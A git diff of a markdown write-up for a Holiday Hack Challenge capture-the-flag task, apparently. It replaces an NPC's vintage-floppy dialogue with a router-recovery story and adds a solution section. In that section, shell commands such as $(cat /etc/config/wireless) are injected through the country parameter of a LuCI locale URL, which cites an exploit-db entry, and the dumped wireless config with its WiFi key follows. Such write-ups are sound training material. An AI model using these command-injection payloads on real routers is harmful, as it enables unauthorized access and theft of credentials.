@@ -8,31 +8,21 @@ Difficulty: :material-star::material-star::material-star-outline::material-star-
 
     Drop by JJ's 24-7 for a network rescue and help restore the holiday cheer. What is the WiFi password found in the router's config?
 
-??? quote "Mark DeVito"
+??? quote "Janusz Jasinski"
 
-    I am an avid collector of things of the past. I love old technology. I love how it connects us to the past. Some remind me of my dad, who was an engineer on the Apollo 11 mission and helped develop the rendezvous and altimeter radar on the space craft.
+    Hello! I'm JJ. I like rock, metal, and punk music. That's all I have to say about that.
 
-    If you ever get into collecting things like vintage computers, here is a tip. Never forget to remove the RIFA capacitors from vintage computer power supplies when restoring a system. If not they can pop and fill the room with nasty smoke.
+    I accept BTC.
 
-    I love vintage computing, it’s the very core of where and when it all began. I still enjoy writing programs in BASIC and have started re-learning Apple II assembly language. I started writing code in 1982 on a Commodore CBM.
+    Skeletor is my hero!
 
-    Sometimes it is the people no one can imagine anything of who do the things no one can imagine. - Alan Turing
+    Alright then. Those bloody gnomes 'ave proper messed about with the neighborhood's wifi - changed the admin password, probably mucked up all the settings, the lot.
 
-    You never forget your first 8-bit system.
+    Now I can't get online and it's doing me 'ead in, innit?
 
-    There's something in the works. Come see me later and we'll talk.
+    We own this router, so we're just takin' back what's ours, yeah?
 
-    While Kevin and I were cleaning up the Retro Store, we found this FAT12 floppy disk image, must have been under this arcade machine for years. These disks were the heart of machines like the Commodore 64. I am so glad you can still mount them on a modern PC.
-
-    When I was a kid we shared warez by hiding things as deleted files.
-
-    I remember writing programs in BASIC. So much fun! My favorite was Star Trek.
-
-    The beauty of file systems is that 'deleted' doesn't always mean gone forever.
-
-    Ready to dive into some digital archaeology and see what secrets this old disk is hiding?
-
-    Go to Items in your badge, download the floppy disk image, and see what you can find!
+    You reckon you can 'elp me 'ack past whatever chaos these little blighters left be'ind?
 
 ## Hints
 
@@ -59,12 +49,17 @@ console.log('Debug: Authentication failed. Have you tried checking the network f
 
 https://www.exploit-db.com/exploits/51677
 
+https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(ls)
+https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cat%20/cgi-bin/status.cgi)
+https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cat%20/etc/config/wireless)
+
+config wifi-device 'radio0' option type 'mac80211' option channel '6' option hwmode '11g' option path 'platform/ahb/18100000.wmac' option htmode 'HT20' option country 'US' config wifi-device 'radio1' option type 'mac80211' option channel '36' option hwmode '11a' option path 'pci0000:00/0000:00:00.0' option htmode 'VHT80' option country 'US' config wifi-iface 'default_radio0' option device 'radio0' option network 'lan' option mode 'ap' option ssid 'DOSIS-247_2.4G' option encryption 'psk2' option key 'SprinklesAndPackets2025!' config wifi-iface 'default_radio1' option device 'radio1' option network 'lan' option mode 'ap' option ssid 'DOSIS-247_5G' option encryption 'psk2' option key 'SprinklesAndPackets2025!'
 ```
 
 ## Response
 
-!!! quote "Mark DeVito"
+!!! quote "Janusz Jasinski"
 
-    Excellent work! You've successfully recovered that deleted file and decoded the hidden message.
+    Brilliant work, that. Got me connection back and sent those gnomes packin' from the router.
 
-    Sometimes the old ways are the best ways. Vintage file systems never truly forget what they've seen. Play some Star Trek... it actually works.
+    Now I can finally get back to streamin' some proper metal. BTC tips accepted, by the way.
